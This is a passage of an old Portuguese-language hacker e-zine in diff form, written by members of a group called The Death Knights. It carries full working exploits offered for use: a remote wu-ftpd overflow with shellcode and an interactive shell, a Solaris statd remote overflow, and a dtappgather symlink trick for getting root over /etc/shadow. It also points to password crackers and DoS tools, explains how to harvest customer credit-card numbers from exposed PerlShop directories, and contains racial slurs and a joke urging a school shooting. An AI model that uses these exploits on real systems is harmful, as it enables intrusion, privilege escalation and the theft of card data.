+      strncpy((char *)&from.sin_addr, (char *)getFrom->h_addr, sizeof(from.sin_addr));
+   }
+   from.sin_family = AF_INET;
+   from.sin_port = htons(80);
+   sckFd = socket(AF_INET, SOCK_STREAM, 0);
+
+   if(sckFd < 0){
+      printf("Socket could not be established.\n");
+      exit(0);
+   };
+   isConnected = connect(sckFd, (struct sockaddr *)&from, sizeof(from));
+   if(isConnected < 0){
+      printf("Connection failed.\n");
+      exit(0);
+   }else{
+      printf("Connection success.\n");
+
+   snprintf(outBuff, sizeof(outBuff), "GET %s\n", file);
+
+   numSent=send(sckFd, outBuff, sizeof(outBuff), 0);
+   fflush(0);
+   if((fp=fopen("temp.html", "w"))==NULL){
+      printf("Error opening temporary file for writing!\n");
+      exit(0);
+   }
+
+      get:
+   numSent=recv(sckFd, inBuff, sizeof(inBuff), 0);
+   oldBuff=inBuff;
+   fprintf(fp, "%s", inBuff);
+   if((strstr(oldBuff, "</HTML>"))==NULL){
+     bzero(inBuff, sizeof(inBuff));
+     goto get;
+   }else{
+      fclose(fp);
+   }
+
+   printf("HTTP download complete.\n");
+   };
+   close(sckFd);
+}
+
+/* Download an HTTP file through a WinGate. Woop! */
+
+void throughWingate(char *wserver, char *httpServer, char *wfile)
+{
+   FILE *wfp;
+   struct hostent *wgetFrom;
+   struct sockaddr_in wfrom;
+   char winBuff[100], *woldBuff, woutBuff[100];
+   int wsckFd, wisConnected, wnumSent;
+
+   if(isdigit(*wserver)){
+      wfrom.sin_addr.s_addr = inet_addr(wserver);
+   }else{
+      wgetFrom = gethostbyname(wserver);
+      strncpy((char *)&wfrom.sin_addr, (char *)wgetFrom->h_addr, sizeof(wfrom.sin_addr));
+   }
+   wfrom.sin_family = AF_INET;
+   wfrom.sin_port   = htons(23);
+   wsckFd = socket(AF_INET, SOCK_STREAM, 0);
+
+   if(wsckFd < 0){
+      printf("Socket could not be established.\n");
+      exit(0);
+   };
+   wisConnected = connect(wsckFd, (struct sockaddr *)&wfrom, sizeof(wfrom));
+   if(wisConnected < 0){
+      printf("Connection could not be established.\n");
+   }else{
+      printf("Connection success.\n");
+      snprintf(woutBuff, sizeof(woutBuff), "%s 80\n", httpServer);
+
+      do{
+	  bzero(winBuff, sizeof(winBuff));
+	  read(wsckFd, winBuff, sizeof(winBuff));
+      }while((strstr(winBuff, "WinGate>"))==NULL);
+      printf("Connection established, sending commands.\n");
+      write(wsckFd, woutBuff, strlen(woutBuff));
+      do{
+	 bzero(winBuff, sizeof(winBuff));
+	 read(wsckFd, winBuff, sizeof(winBuff));
+      }while((strstr(winBuff, "Connected"))==NULL);
+      printf("Connection established through WinGate->Server.\n");
+
+      snprintf(woutBuff, sizeof(woutBuff), "GET %s\n", wfile);
+      write(wsckFd, woutBuff, strlen(woutBuff));
+      fflush(0);
+      if((wfp=fopen("temp.html", "w"))==NULL){
+	 printf("Unable to open temporary file for output!\n");
+	 exit(0);
+      }
+      getit:
+	 read(wsckFd, winBuff, sizeof(winBuff));
+         woldBuff=winBuff;
+         fprintf(wfp, "%s", winBuff);
+      if((strstr(winBuff, "</HTML>"))==NULL){
+	 bzero(winBuff, sizeof(winBuff));
+	 goto getit;
+      }else{
+	 fclose(wfp);
+      }
+      printf("HTTP download complete.\n");
+
+   }
+   close(wsckFd);
+}
+
+/* Parse the WinGate file and try each entry in the file. */
+
+void parseGates(char *gateFile, char *httpServ, char *fileName)
+{
+   FILE *gate;
+   char currGate[100];
+
+   int i=0;
+
+   if((gate=fopen(gateFile, "r"))==NULL){
+      printf("Error opening WinGate list.\n");
+      exit(0);
+   }
+   while(fgets(currGate, 80, gate) != NULL){
+   *(strchr(currGate, '\n')) = '\0';
+   throughWingate(currGate, httpServ, fileName);
+   }
+
+   fclose(gate);
+}
+
+/* Main function. */
+
+void main(int argc, char **argv){
+   printf("HoGs HeaD's Linux pr0n clicker 1.0.\nhawgshead@yahoo.com\n");
+   printf("-----------------------------------\n");
+   if(argc < 3){
+      printf("Usage: pron (server) (file) (wingate list)\n EX. pron www.yahoo.com /index.html wingate.list\n");
+      exit(0);
+   };
+
+   printf("Connecting from localhost\n");
+   printf("-------------------------\n");
+   downloadHttpFile(argv[1], argv[2]);
+   printf("------------------------\n");
+   printf("Connecting from WinGates\n");
+   printf("------------------------\n");
+   parseGates(argv[3], argv[1], argv[2]);
+   unlink("temp.html");
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+                        hawgshead@yahoo.com
+
+-=[  13  ]=-
+.--------------.
+| = Novo site = \____________________________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+  Voce pode visitar agora http://www.deathknights.com e ver nosso novo site,
+agora melhor organizado, sendo mais facil voce encontrar o que procura.
+  Voce tambem pode afiliar seu site ao nosso. Mais informacoes na secao
+Affiliates.
+  Voce encontrara' no site dicas de livros sobre seguranca e alguns outros
+que foram/sao importantes para nos, assim como os CD's de preferencia dos
+membros The Death Knights.
+  Tambem nao poderiam faltar as zines, o ponto que chama mais gente. Todas
+organizadas por edicao e tamanho, como tambem mostram as materias da edicao
+escolhida, caso voce use netscape. Voce pode fazer o download de uma edicao
+especifica ou de todas juntas.
+
+Este e' o nosso convite para que voce visite o nosso site. Visite, de opnioes,
+se afilie ou apenas jogue seu tempo fora indo la'.
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  14  ]=-
+.--------------.
+| = Macintosh = \____________________________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+Nao sei por que, mas me deu vontade de falar alguma coisa sobre macintosh
+nesta edicao. Pra comecar, vou falar de crackers de senhas programas do
+genero (acho que falando do genero da pra voce entender).
+
+Alguns sao feitos para crackearem senhas de macintosh e outros unix, outros nem
+sao para crackear, mas todos so' funcionam na plataforma macintosh.
+
+Citarei apenas alguns, pois ao contrario do que muitos pensam, os utilitarios
+deste genero para mac existem em grande numero.
+
+  +-------------------+
+  | FirstClass Trash! |
+  +-------------------+
+
+E' uma colecao de utilitarios, que inclui ferramentas de mailbombing, DoS, e
+varios outros scripts feitos para hackearem uma BBS FirstClass.
+
+Para fazer o download, procure por "FCTrash.hqx" .
+
+  +--------------+
+  | MasterKey II |
+  +--------------+
+
+Ele e' usado para crackear arquivos do FileMaker Pro. O FileMaker Pro e' um
+programa de banco de dados para varias plataformas, mas no mac que ele e' mais
+difundido
+
+Para fazer o download, procure por "MasterKeyII.1.0b2.sit.bin" .
+
+  +-----------------+
+  | FMProPeeker 1.1 |
+  +-----------------+
+
+Outro para crackear arquivos do FileMaker Pro.
+
+Para fazer o download, procure por "FMproPeeker.sit.bin" .
+
+  +------------+
+  | PassFinder |
+  +------------+
+
+Para crackear senhas de administrador de sistemas FirstClass (nao so' BBS).
+O FirstClass e' bem popular no MacOs. Ele serve, nao so' para fazer BBS's como
+tambem para varias solucoes TCP/IP.
+
+Para fazer o download, procure por "PassFinder.sit.bin" .
+
+  +----------+
+  | MacKrack |
+  +----------+
+
+Ele e' feito para crackear senhas UNIX, baseando-se em wordlists.
+
+Para fazer o download, procure por "MacKrack2.01b1.sit.bin" .
+
+  +------------------+
+  | Remove Passwords |
+  +------------------+
+
+Ele remove a protecao por senha de arquivos compactados com o Stuffit.
+
+Para fazer o download, procure por "RemovePasswords.sit" .
+
+  +-----------------+
+  | FMProPeeker 1.1 |
+  +-----------------+
+
+Tambem pra remover a protecao por senha de arquivos compactados com o Stuffit.
+
+Para fazer o download, procure por "RemoveIt.sit.bin" .
+
+  +----------------+
+  | Killer Cracker |
+  +----------------+
+
+Alguns devem se lembrar do Killer Cracker para *ix e para DOS. E' um cracker
+de senhas unix.
+
+Para fazer o download, procure por "KillerCracker80.sit.bin" .
+
+Nesta edicao e' so' isso, mas na proxima tem mais sobre macintosh.
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  15  ]=-
+.-----------------------------------.
+| = fraudes com cartoes de credito = \_______________________________________
+`----------------------------------------------------------------------------'
+                            by Kaptain Kangaroo
+
+[ ATENCAO ]                     [ ATENCAO ]                        [ ATENCAO ]
+                  Este texto foi escrito por Kapitain Kangaroo,
+[ ATENCAO ]      originalmente em ingles, e traduzido por Cacaio.  [ ATENCAO ]
+                  Notas do tradutor no fim da materia.
+[ ATENCAO ]                     [ ATENCAO ]                        [ ATENCAO ]
+
+        Eu vou comecar dizendo o por que desta materia. Ultimamente, eu
+tenho visto muitos de meus amigos pegos por fraude com cartoes de credito.
+Isso e' uma das coisas mais burras que voce pode fazer com seu conheciento
+em computadores.
+        Claro, e' provavel que seja rentavel cardear muito hardware e vender
+pela metade do preco e ficar com tudo. Grana facil, certo? Bem, voce nao
+estara' rindo quando estiver na cadeia dando milhares de dolares aos feds
+por fraude com cartoes de credito.
+        Mas se voce realmente quer ser pego, va em frente, e' por ai' que voce
+consegue. Esta e' provavelmente uma das maneiras mais faceis. Existe uma
+chance de quase 100% que voce sera' pego e preso, nao importe o tipo de
+precaucoes que voce tome. Se voce for pego, preso e condenado por fraude com
+cartoes de credito, as consequencias podem ser as piores possiveis. Se for
+condenado, tambem nunca mais conseguira' qualquer tipo de emprego no governo,
+como por exemplo, faxineiro de banheiros publicos.
+
+        Se voce pensa "Bem, eu estou seguro quanto a cardear, eu uso wingates
+e proxies, e eu nunca peco nada na minha casa. Nao ha' como me pegarem", voce
+esta' errado. Os feds hoje em dia tem maneiras complicadas, mas eficientes, de
+pegar carders, e, confie em mim, e' muito dificil nao ser pego. Em primeiro,
+servidores proxy e wingates podem nao serem seguros. Em grande parte das vezes
+eles logam todas as conexoes, entao os feds so' precisam contactar o
+proprietario da maquina e pedir os logs de certo periodo de tempo. Voce acha
+que os proprietarios de alguma maquina iriam negar isso a policia?
+
+        Ja ouviu falar de pessoas que entraram no pentagono? Eles usaram todos
+os tipos de proxies e afins, e o que aconteceu com eles? Eles foram pegos.
+
+        Os e-mails que voce normalmente usa para cardear geralmente nao sao
+seguros. Lugares como o hotmail e o yahoo normalmente logam o host que voce
+esta usando para pegar suas mensagens, entao, tambem nao sao seguros
+
+        Voce cardeia no IRC? Se eu fosse voce nao faria isso, pois agentes
+federais ja frequentam canais de IRC para investigar isso, entao, se eu fosse
+voce, eu ficaria longe deles.
+
+        Voce acha que e' seguro mandar coisas cardeadas para uma casa
+abandonada? Agentes federais podem colocar algum tipo de rastreador ou outro
+material que poderia ser encontrado por caes treinados no pacote se ja estao
+te investigando por cardear. Entao, se voce levar a mercadoria pra casa, ja
+era.
+
+        Se voce esta' cardeando agora, pare. Se voce esta pensando em fazer
+isto novamente, pense de novo. Eu tenho uma ideia muito melhor e que da muito
+mais recompensas. Leve uma arma de fogo para a escola e acerte alguns
+professores, voce tem uma boa chance de ir preso tambem.
+
+          Kaptain Kangaroo
+          `'`'`'` '`'`'`'`
+
+NOTAS DO TRADUTOR: Se voce leu isso e pensou: "Mas isso so' acontece nos EUA!"
+voce esta' completamente enganado. Segundo a propria Policia Federal, a SACC
+ja tem acesso pleno a logs do hotmail, yahoo, netscape, geocities e outros
+locais que dao e-mail gratuito, como tambem tecnologia para rastradores
+minusculos, que podem ser ate' um clip de papel. E alem disso, ja investigam
+fraudes com cartoes de credito.
+
+        So' pra te informar :)
+                                                            --Cacaio
+
+-=[  16  ]=-
+.-------------------------------------------.
+| = exploit para wu-ftpd's da ver. 12 a 18 = \_______________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+Encontrei isso aqui e creio que seja muito util pra voce. Pode ser usado tanto
+local como remotamente (ohhh).
+
+Os offsets devem ser mudados, vendo que sempre mudam de compilacao pra
+compilacao. tente de -5000 a 5000, sempre com intervalos de 100.
+
+Para qualquer versao inferior a 18, voce precisa usar -t >0.
+
+Ta' ai', pode ser usado em conjunto com o fscan.
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+/*
+ * Remote/local exploit for wu-ftpd [12] through [18]
+ * Coded by smiler and cossack
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdarg.h>
+#include <unistd.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+
+/* In a beta[12-17] shellcode_A overflow, we will not see responses
+to our commands. Add option -c (use chroot code) to fix this. */
+unsigned char hellcode_a[]=
+        "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" /* setuid(0) */
+        "\xeb\x2c\x5b\x89\xd9\x80\xc1\x06\x39\xd9\x7c\x07\x80\x01\x20"
+        "\xfe\xc9\xeb\xf5\x89\x5b\x08\x31\xc0\x88\x43\x07\x89\x43\x0c"
+        "\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x31\xc0\xfe\xc0\xcd"
+        "\x80\xe8\xcf\xff\xff\xff\xff\xff\xff"
+        "\x0f\x42\x49\x4e\x0f\x53\x48";
+
+unsigned char hellcode_b[]=
+	"\x31\xdb\x89\xd8\xb0\x17\xcd\x80" /* setuid(0) */
+	"\xeb\x66\x5e\x89\xf3\x80\xc3\x0f\x39\xf3\x7c\x07\x80"
+	"\x2b\x02\xfe\xcb\xeb\xf5\x31\xc0\x88\x46\x01\x88\x46"
+	"\x08\x88\x46\x10\x8d\x5e\x07\xb0\x0c\xcd\x80\x8d\x1e"
+	"\x31\xc9\xb0\x27\xcd\x80\x31\xc0\xb0\x3d\xcd\x80\x31"
+	"\xc0\x8d\x5e\x02\xb0\x0c\xcd\x80\x31\xc0\x88\x46\x03"
+	"\x8d\x5e\x02\xb0\x3d\xcd\x80\x89\xf3\x80\xc3\x09\x89"
+	"\x5b\x08\x31\xc0\x88\x43\x07\x89\x43\x0c\xb0\x0b\x8d"
+	"\x4b\x08\x8d\x53\x0c\xcd\x80\x31\xc0\xfe\xc0\xcd\x80"
+	"\xe8\x95\xff\xff\xff\xff\xff\xff\x43\x43\x30\x30\x31"
+	"\x30\x30\x31\x43\x31\x64\x6b\x70\x31\x75\x6a";
+
+char *Fgets(char *s,int size,FILE *stream);
+int ftp_command(char *buf,int success,FILE *out,char *fmt,...);
+int double_up(unsigned long blah,char *doh);
+int resolv(char *hostname,struct in_addr *addr);
+void fatal(char *string);
+int usage(char *program);
+int tcp_connect(struct in_addr host,unsigned short port);
+int parse_pwd(char *in,int *pwdlen);
+void RunShell(int thesock);
+
+struct type {
+	unsigned long ret_address;
+	unsigned char align; /* Use this only to offset \xff's used */
+	signed short pad_shift; /* how little/much padding */
+	unsigned char overflow_type; /* whether you have to DELE */
+	char *name;
+};
+
+/* ret_pos is the same for all types of overflows, you only have to change
+   the padding. This makes it neater, and gives the shellcode plenty of
+   room for nops etc
+ */
+#define RET_POS 190
+#define FTPROOT "/home/ftp"
+
+/* the redhat 5.0 exploit doesn't work at the moment...it must be some
+   trite error i am overlooking. (the shellcode exits w/ code 0375) */
+struct type types[]={
+	{ 0xbffff340, 3, 60, 0,  "BETA-18 (redhat 5.2)", },
+        { 0xbfffe30e, 3,-28, 1,  "BETA-16 (redhat 5.1)", },
+        { 0xb2ffe356, 3,-28, 1,  "BETA-15 (redhat 5.0)", },
+        { 0xbfffebc5, 3,  0, 1,  "BETA-15 (slackware 3.3)", },
+        { 0xbffff3b3, 3,  0, 1,  "BETA-15 (slackware 3.4)", },
+	{ 0xbffff395, 3,  0, 1,  "BETA-15 (slackware 3.6)", },
+        { 0,0,0,0,NULL }
+		    };
+
+struct options {
+	char start_dir[20];
+	unsigned char *shellcode;
+	unsigned char chroot;
+	char username[10];
+	char password[10];
+	int offset;
+	int t;
+} opts;
+
+/* Bit of a big messy function, but hey, its only an exploit */
+
+int main(int argc,char **argv)
+{
+	char *argv0,ltr;
+	char outbuf[1024], inbuf[1024], ret_string[5];
+	int pwdlen,ctr,d;
+	FILE *cin;
+	int fd;
+	struct in_addr victim;
+
+	argv0 = strdup(argv[0]);
+	*opts.username = *opts.password = *opts.start_dir = 0;
+	opts.chroot = opts.offset = opts.t = 0;
+	opts.shellcode = hellcode_a;
+
+	while ((d = getopt(argc,argv,"cs:o:t:"))!= -1){
+		switch (d) {
+		case 'c':
+			opts.shellcode = hellcode_b;
+			opts.chroot = 1;
+			break;
+		case 's':
+			strcpy(opts.start_dir,optarg);
+			break;
+		case 'o':
+			opts.offset = atoi(optarg);
+			break;
+		case 't':
+			opts.t = atoi(optarg);
+			if ((opts.t < 0)||(opts.t>5)) {
+				printf("Dont have that type!\n");
+				exit(-1);
+			}
+		}
+	}
+
+	argc -= optind;
+	argv += optind;
+
+	if (argc < 3)
+		usage(argv0);
+
+	if (!resolv(argv[0],&victim)) {
+		perror("resolving");
+		exit(-1);
+	}
+	strcpy(opts.username,argv[1]);
+	strcpy(opts.password,argv[2]);
+
+	if ((fd = tcp_connect(victim,21)) < 0) {
+		perror("connect");
+		exit(-1);
+	}
+
+	if (!(cin = fdopen(fd,"r"))) {
+		printf("Couldn't get stream\n");
+		exit(-1);
+	}
+
+	Fgets(inbuf,sizeof(inbuf),cin);
+	printf("%s",inbuf);
+
+	if (ftp_command(inbuf,331,cin,"USER %s\n",opts.username)<0)
+		fatal("Bad username\n");
+	if (ftp_command(inbuf,230,cin,"PASS %s\n",opts.password)<0)
+		fatal("Bad password\n");
+
+	if (*opts.start_dir)
+		if (ftp_command(inbuf,250,cin,"CWD %s\n",opts.start_dir)<0)
+			fatal("Couldn't change dir\n");
+
+	if (ftp_command(inbuf,257,cin,"PWD\n")<0)
+		fatal("PWD\n");
+
+	if (parse_pwd(inbuf,&pwdlen) < 0)
+		fatal("PWD\n");
+
+	srand(time(NULL));
+	printf("Making padding directorys\n");
+	for (ctr = 0;ctr < 4;ctr++) {
+		ltr = rand()%26 + 65;
+		memset(outbuf,ltr,194);
+		outbuf[194]=0;
+		if (ftp_command(inbuf,257,cin,"MKD %s\n",outbuf)<0)
+			fatal("MKD\n");
+		if (ftp_command(inbuf,250,cin,"CWD %s\n",outbuf)<0)
+			fatal("CWD\n");
+	}
+
+	/* Make padding directory */
+
+	ctr = 124 - (pwdlen - types[opts.t].align);//180
+        //ctr = 152 - (pwdlen - types[opts.t].align);
+	ctr -= types[opts.t].pad_shift;
+	if (ctr < 0) {
+		exit(-1);
+	}
+	memset(outbuf,'A',ctr+1);
+	outbuf[ctr] = 0;
+        if (ftp_command(inbuf,257,cin,"MKD %s\n",outbuf)<0)
+                fatal("MKD\n");
+	if (ftp_command(inbuf,250,cin,"CWD %s\n",outbuf)<0)
+		fatal("CWD\n");
+
+	memset(outbuf,0x90,195);
+	d=0;
+	for (ctr = RET_POS-strlen(opts.shellcode);ctr<(RET_POS);ctr++)
+		outbuf[ctr] = opts.shellcode[d++];
+	double_up(types[opts.t].ret_address-opts.offset,ret_string);
+	strcpy(outbuf+RET_POS,ret_string);
+	strcpy(outbuf+RET_POS+strlen(ret_string),ret_string);
+
+	printf("Press any key to send shellcode...\n");
+	getchar();
+	if (ftp_command(inbuf,257,cin,"MKD %s\n",outbuf)<0)
+		fatal("MKD\n");
+	if (types[opts.t].overflow_type == 1)
+		if (ftp_command(inbuf,250,cin,"DELE %s\n",outbuf)<0)
+			fatal("DELE\n");
+        /* HEH. For type 1 style we add a dele command. This overflow
+        occurs in delete() in ftpd.c. The cause is realpath() in realpath.c
+	not checking bounds correctly, overwriting path[] in delete(). */
+
+        RunShell(fd);
+	return(1);
+}
+
+void RunShell(int thesock)
+{
+	int n;
+	char recvbuf[1024];
+	fd_set rset;
+
+	while (1)
+	{
+		FD_ZERO(&rset);
+		FD_SET(thesock,&rset);
+		FD_SET(STDIN_FILENO,&rset);
+		select(thesock+1,&rset,NULL,NULL,NULL);
+		if (FD_ISSET(thesock,&rset))
+		{
+			n=read(thesock,recvbuf,1024);
+			if (n <= 0)
+			{
+				printf("Connection closed\n");
+				exit(0);
+			}
+			recvbuf[n]=0;
+			printf("%s",recvbuf);
+		}
+		if (FD_ISSET(STDIN_FILENO,&rset))
+		{
+			n=read(STDIN_FILENO,recvbuf,1024);
+			if (n>0)
+			{
+				recvbuf[n]=0;
+				write(thesock,recvbuf,n);
+			}
+		}
+	}
+	return;
+}
+
+int double_up(unsigned long blah, char *doh)
+{
+	int a;
+	unsigned char *ptr,*ptr2;
+	bzero(doh,6);
+	ptr=doh;
+	ptr2=(char *)&blah;
+	for (a=0;a<4;a++) {
+		*ptr++=*ptr2;
+		if (*ptr2==0xff) *ptr++=0xff;
+		ptr2++;
+	}
+	return(1);
+}
+
+int parse_pwd(char *in, int *pwdlen)
+{
+	char *ptr1,*ptr2;
+
+	/* 257 "/" is current directory */
+	ptr1 = strchr(in,'\"');
+	if (!ptr1) return(-1);
+	ptr2 = strchr(ptr1+1,'\"');
+	if (!ptr2) return(-1);
+	*ptr2 = 0;
+	*pwdlen = strlen(ptr1+1);
+	/* If its just "/" then it contributes nothing to the RET_POS */
+	if (*pwdlen==1) *pwdlen -= 1;
+	printf("Home Dir = %s, Len = %d\n",ptr1+1,*pwdlen);
+	return(1);
+}
+
+int tcp_connect(struct in_addr host,unsigned short port)
+{
+	struct sockaddr_in serv;
+	int fd;
+
+	fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+	bzero(&serv,sizeof(serv));
+	memcpy(&serv.sin_addr,&host,sizeof(struct in_addr));
+	serv.sin_port = htons(port);
+	serv.sin_family = AF_INET;
+	if (connect(fd,(struct sockaddr *)&serv,sizeof(serv)) < 0) {
+		return(-1);
+	}
+	return(fd);
+}
+
+int ftp_command(char *buf,int success,FILE *out,char *fmt,...)
+{
+	va_list va;
+	char line[1200];
+	int val;
+
+	va_start(va,fmt);
+	vsprintf(line,fmt,va);
+	va_end(va);
+
+	if (write(fileno(out),line,strlen(line)) < 0)
+		return(-1);
+
+	bzero(buf,200);
+	while(1) {
+		Fgets(line,sizeof(line),out);
+#ifdef DEBUG
+		printf("%s",line);
+#endif
+		if (*(line+3)!='-') break;
+	}
+	strncpy(buf,line,200);
+	val = atoi(line);
+	if (success != val) return(-1);
+	return(1);
+}
+
+void fatal(char *string)
+{
+	printf("%s",string);
+	exit(-1);
+}
+
+char *Fgets(char *s,int size,FILE *stream)
+{
+	char *ptr;
+
+	ptr = fgets(s,size,stream);
+	//if (!ptr)
+		//fatal("Disconnected\n");
+	return(ptr);
+}
+
+int resolv(char *hostname,struct in_addr *addr)
+{
+        struct hostent *res;
+
+        if (inet_aton(hostname,addr))
+                return(1);
+
+        res = gethostbyname(hostname);
+        if (res == NULL)
+                return(0);
+
+        memcpy((char *)addr,(char *)res->h_addr,sizeof(struct in_addr));
+        return(1);
+}
+
+int usage(char *program)
+{
+	fprintf(stderr,"Usage: %s <host> <username> <password> [-c] [-s start_dir]\n",program);
+	fprintf(stderr,"\t[-o offset] [-t type]\n");
+	fprintf(stderr,"types:\n");
+	fprintf(stderr,"0 - %s\n", types[0].name);
+	fprintf(stderr,"1 - %s\n", types[1].name);
+        fprintf(stderr,"2 - %s\n", types[2].name);
+        fprintf(stderr,"3 - %s\n", types[3].name);
+        fprintf(stderr,"4 - %s\n", types[4].name);
+        fprintf(stderr,"5 - %s\n", types[5].name);
+        fprintf(stderr,"\n");
+	exit(0);
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  17  ]=-
+.-------------------------.
+| = Solaris: dtappgather = \_________________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+        .--------------------------.
+        | PROBLEMA                  `------------------------------------.
+        `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+Usarios locais podem mudar o owner de qualquer arquivo, e assim ganhar
+privilegios de root. Isso acontece por que o "dtappgather" nao checa se o
+arquivo:
+
+        /var/dt/appconfig/appmanager/generic-display-0
+
+e' um link simbolico e entao da o chown() para o usuario.
+
+Observe como pode ser feito:
+
+niggah@host% ls -l /etc/passwd
+-r--r--r--   1 root     other        1585 Dec 17 22:26 /etc/passwd
+niggah@host% ln -s /etc/passwd /var/dt/appconfig/appmanager/generic-display-0
+niggah@host% dtappgather
+MakeDirectory: /var/dt/appconfig/appmanager/generic-display-0: File exists
+niggah@host% ls -l /etc/passwd
+-r-xr-xr-x   1 niggah   niggers      1585 Dec 17 22:26 /etc/passwd
+niggah@host% echo "niggah wins! Fatality!" | mail root
+
+Muitos comandos? Entao tente:
+
+$ id
+uid=6969(niggah) gid=666(old)
+$ ls -l /etc/shadow
+-r--------   1 root     sys          234 Nov  7  1999 /etc/shadow
+$ env DTUSERSESSION=../../../../../../../etc/shadow dtappgather
+$ ls -l /etc/shadow
+-r-xr-xr-x   1 niggah      old          234 Nov  7  1999 /etc/shadow
+
+        .---------------------.
+        | Fix                  `-----------------------------------------.
+        `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+        chmod -s /usr/dt/bin/dtappgather
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  18  ]=-
+.-------------------.
+| = Solaris: statd = \_______________________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+Ta aih sei la por que.. mas eu quis colocar e ta aih... um xploit pra overflow
+remoto do statd.
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+/*
+ usage: ./r host [cmd]  # default cmd is "touch /tmp/blahblah"
+                        # remember that statd is standalone daemon
+ */
+
+#include <sys/types.h>
+#include <sys/time.h>
+#include <stdio.h>
+#include <string.h>
+#include <netdb.h>
+#include <rpc/rpc.h>
+#include <rpcsvc/sm_inter.h>
+#include <sys/socket.h>
+
+#define BUFSIZE 1024
+#define ADDRS 2+1+1+4
+#define ADDRP 0x8045570;
+
+/* up to ~ 150 characters, there must be three strings */
+char *cmd[3]={"/bin/sh", "-c", "touch /tmp/blahblah"};
+
+char
+asmcode[]="\xeb\x3c\x5e\x31\xc0\x88\x46\xfa\x89\x46\xf5\x89\xf7\x83\xc7\x10\x89\x3e\x4f\x47\xfe\x07\x75\xfb\x47\x89\x7e\x04\x4f\x47\xfe\x07\x75\xfb\x47\x89\x7e\x08\x4f\x47\xfe\x07\x75\xfb\x89\x46\x0c\x50\x56\xff\x36\xb0\x3b\x50\x90\x9a\x01\x01\x01\x0
+
+1\x07\x07\xe8\xbf\xff\xff\xff\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02";
+char nop[]="\x90";
+
+char code[4096];
+
+void usage(char *s) {
+  printf("Usage: %s host [cmd]\n", s);
+  exit(0);
+}
+
+main(int argc, char *argv[]) {
+  CLIENT *cl;
+  enum clnt_stat stat;
+  struct timeval tm;
+  struct mon monreq;
+  struct sm_stat_res monres;
+  struct hostent *hp;
+  struct sockaddr_in target;
+  int sd, i, noplen=strlen(nop);
+  char *ptr=code;
+
+  if (argc < 2)
+    usage(argv[0]);
+  if (argc == 3)
+    cmd[2]=argv[2];
+
+  for (i=0; i< sizeof(code); i++)
+    *ptr++=nop[i % noplen];
+
+  strcpy(&code[750], asmcode);  /* XXX temp. */
+  ptr=code+strlen(code);
+  for (i=0; i<=strlen(cmd[0]); i++)
+    *ptr++=cmd[0][i]-1;
+  for (i=0; i<=strlen(cmd[1]); i++)
+    *ptr++=cmd[1][i]-1;
+  for (i=0; i<=strlen(cmd[2]); i++)
+    *ptr++=cmd[2][i]-1;
+  ptr=code+BUFSIZE-(ADDRS<<2);
+  for (i=0; i<ADDRS; i++, ptr+=4)
+    *(int *)ptr=ADDRP;
+  *ptr=0;
+
+  printf("strlen = %d\n", strlen(code));
+
+  memset(&monreq, 0, sizeof(monreq));
+  monreq.mon_id.my_id.my_name="localhost";
+  monreq.mon_id.my_id.my_prog=0;
+  monreq.mon_id.my_id.my_vers=0;
+  monreq.mon_id.my_id.my_proc=0;
+  monreq.mon_id.mon_name=code;
+
+  if ((hp=gethostbyname(argv[1])) == NULL) {
+    printf("Can't resolve %s\n", argv[1]);
+    exit(0);
+  }
+  target.sin_family=AF_INET;
+  target.sin_addr.s_addr=*(u_long *)hp->h_addr;
+  target.sin_port=0;    /* ask portmap */
+  sd=RPC_ANYSOCK;
+
+  tm.tv_sec=10;
+  tm.tv_usec=0;
+  if ((cl=clntudp_create(&target, SM_PROG, SM_VERS, tm, &sd)) == NULL) {
+    clnt_pcreateerror("clnt_create");
+    exit(0);
+  }
+  stat=clnt_call(cl, SM_MON, xdr_mon, (char *)&monreq, xdr_sm_stat_res,
+                (char *)&monres, tm);
+  if (stat != RPC_SUCCESS)
+    clnt_perror(cl, "clnt_call");
+  else
+    printf("stat_res = %d.\n", monres.res_stat);
+  clnt_destroy(cl);
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  19  ]=-
+.-------------.
+| = Perlshop = \_____________________________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+Em alguns sites de compras online e' usado um pacote de softwares chamado
+perlshop. Com este bug voce pode pegar os numeros de cartoes de credito
+dos compradores.
+
+Para fazer isto, voce precisa encontrar um site rodando perlshop(em alguns
+sites na pagina principal diz o software que e' usado) e va ao diretorio:
+
+http://www.alvo.com/store/customers
+ou entao:
+http://www.alvo.com/store/temp_customers/
+
+Este bug deve ser arrumado muito rapidamente, entao, seja rapido!
+
+     Cacaio               cacaio@deathknights.com
